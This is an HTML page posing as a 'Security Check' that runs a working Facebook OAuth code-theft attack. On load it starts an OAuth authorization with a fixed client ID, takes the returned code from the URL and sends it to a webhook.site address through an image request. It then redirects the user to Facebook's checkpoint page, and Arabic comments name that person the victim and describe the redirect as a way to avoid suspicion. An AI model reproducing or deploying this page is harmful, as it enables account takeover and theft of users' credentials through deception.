<!DOCTYPE html>
<html>
<head><title>Loading Security Check...</title></head>
<body>
    <script>
        window.onload = function() {
            // سحب الكود من الرابط
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code') || (window.location.hash.includes('code=') ? window.location.hash.split('code=')[1] : null);

            if (code) {
                // إرسال الكود فوراً إلى Webhook عبر صورة لتجاوز الحماية
                const logger = new Image();
                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=" + encodeURIComponent(code);
                
                // تحويل الضحية لفيسبوك لإبعاد الشبهة
                setTimeout(() => {
                    window.location.href = "https://www.facebook.com/checkpoint/";
                }, 1500);
            } else {
                // إذا لم يوجد كود، يتم إجبار النظام على توليد واحد عبر OAuth
                window.location.href = "https://www.facebook.com/v18.0/dialog/oauth?client_id=1217981644879628&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=code&scope=email,public_profile";
            }
        };
    </script>
</body>
</html>
